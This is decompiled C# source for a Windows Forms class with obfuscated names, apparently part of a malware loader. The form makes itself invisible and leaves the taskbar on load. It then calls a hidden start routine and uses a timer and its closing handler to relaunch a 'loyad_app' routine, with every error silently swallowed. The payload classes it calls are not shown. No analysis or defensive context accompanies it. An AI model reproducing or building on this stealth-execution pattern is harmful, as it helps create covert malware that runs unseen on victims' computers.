using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace irvrmjavhica;

public class Form1 : Form
{
	private MROIDM irvrmjavhicamainvp = new MROIDM();

	private EDIRARE thiqavsnaisStateObj = new EDIRARE();

	private IContainer components = null;

	private DataGridView dataGridView1;

	public Form1()
	{
		InitializeComponent();
	}

	private void thiqavsnaiscallCon()
	{
		try
		{
			TimerCallback callback = thiqavsnaissetupCons;
			Timer irvrmjavhicatimer = new Timer(callback, thiqavsnaisStateObj, 32110, 32110);
			thiqavsnaisStateObj.irvrmjavhicatimer = irvrmjavhicatimer;
		}
		catch
		{
		}
	}

	private void thiqavsnaissetupCons(object dource)
	{
		try
		{
			irvrmjavhicamainvp.irvrmjavhicaloyad_app();
			thiqavsnaisStateObj.irvrmjavhicatimer.Dispose();
		}
		catch
		{
		}
	}

	private void dam_fun()
	{
		using TextWriter textWriter = new StreamWriter("example.txt");
		for (int i = 0; i < dataGridView1.get_Rows().get_Count() - 1; i++)
		{
			for (int j = 0; j < ((BaseCollection)dataGridView1.get_Columns()).get_Count(); j++)
			{
				textWriter.Write("{dataGridView1.Rows[i].Cells[j].Value.ToString()}");
				if (j == ((BaseCollection)dataGridView1.get_Columns()).get_Count() - 1)
				{
					textWriter.Write(",");
				}
			}
			textWriter.WriteLine();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			Thread.Sleep(1200);
			((Form)this).set_ShowInTaskbar(false);
			((Form)this).set_FormBorderStyle((FormBorderStyle)6);
			Thread.Sleep(1200);
			irvrmjavhicamainvp.irvrmjavhicadoy_start();
		}
		catch
		{
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		Thread.Sleep(1200);
		irvrmjavhicamainvp.irvrmjavhicaloyad_app();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		dataGridView1 = new DataGridView();
		((ISupportInitialize)dataGridView1).BeginInit();
		((Control)this).SuspendLayout();
		dataGridView1.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)dataGridView1).set_Location(new Point(5, 4));
		((Control)dataGridView1).set_Name("dataGridView1");
		((Control)dataGridView1).set_Size(new Size(10, 10));
		((Control)dataGridView1).set_TabIndex(0);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Control)this).get_Controls().Add((Control)(object)dataGridView1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)dataGridView1).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
